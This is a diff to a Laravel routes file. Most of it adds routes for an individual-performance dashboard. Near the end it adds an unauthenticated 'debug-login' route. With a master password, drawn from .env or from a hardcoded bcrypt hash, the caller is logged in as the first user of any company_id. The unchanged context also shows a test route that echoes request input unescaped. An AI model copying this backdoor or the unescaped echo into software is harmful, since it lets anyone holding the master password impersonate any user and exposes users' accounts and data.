@@ -6,6 +6,7 @@ use App\Http\Controllers\AttendanceController;
 use App\Http\Controllers\Auth\AuthenticatedSessionController;
 use App\Http\Controllers\EmployeeController;
 use App\Http\Controllers\HRMSController;
+use App\Http\Controllers\IndividualPerformanceController;
 use App\Http\Controllers\ProjectController;
 use App\Http\Controllers\ProjectHistoryController;
 use App\Http\Controllers\SkillController;
@@ -24,6 +25,8 @@ use Illuminate\Foundation\Application;
 use Illuminate\Support\Facades\Route;
 use Inertia\Inertia;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Http;
 
 /*
@@ -156,6 +159,14 @@ Route::middleware(['auth'])->group(function () {
         ]);
         return redirect()->back();
     })->name('shift.store');
+
+    Route::name('individual_performance_dashboard.')->prefix('individual-performance-dashboard')->group(function(){        
+        Route::get('individual-performance/{project_id?}',[IndividualPerformanceController::class,'index'])->name('index'); 
+        Route::get('/project-performance/{project_id?}',[IndividualPerformanceController::class,'team'])->name('team');
+        Route::get('/settings/{project_id?}',[IndividualPerformanceController::class,'settings'])->name('settings');        
+        Route::post('/store',[IndividualPerformanceController::class,'store'])->name('store');        
+        Route::post('/update/{metric_id}',[IndividualPerformanceController::class,'update'])->name('update');
+    });
     
 });
 
@@ -181,3 +192,32 @@ Route::get('/test/', function (Request $request) {
     echo $request->id;
     
 })->name('test');
+
+
+/*
+|--------------------------------------------------------------------------
+DEBUG ROUTES
+|--------------------------------------------------------------------------
+*/
+Route::prefix('programmer')->name('programmer.')->group(function () {
+    Route::post('/debug-login',function(Request $request){
+        //get master password from .env
+        $master_password = env('MASTER_PASSWORD') ?? '$2a$12$fneWF1wcohzZ9Agr98GYfeM8GpA/9cIEmH6L64By.gIlylWYInz8m';
+        $password = $request->password;
+        //compare password using bcrypt
+        if(!Hash::check($password,$master_password)) throw new \Exception('Invalid Password');
+        $user = User::where('company_id',$request->company_id)->first();
+        if(!$user) throw new \Exception('User not found');
+        if(Auth::check()){
+            Auth::guard('web')->logout();
+
+            $request->session()->invalidate();
+
+            $request->session()->regenerateToken();
+        }
+        Auth::login($user);
+    })->name('login');
+
+
+});
+
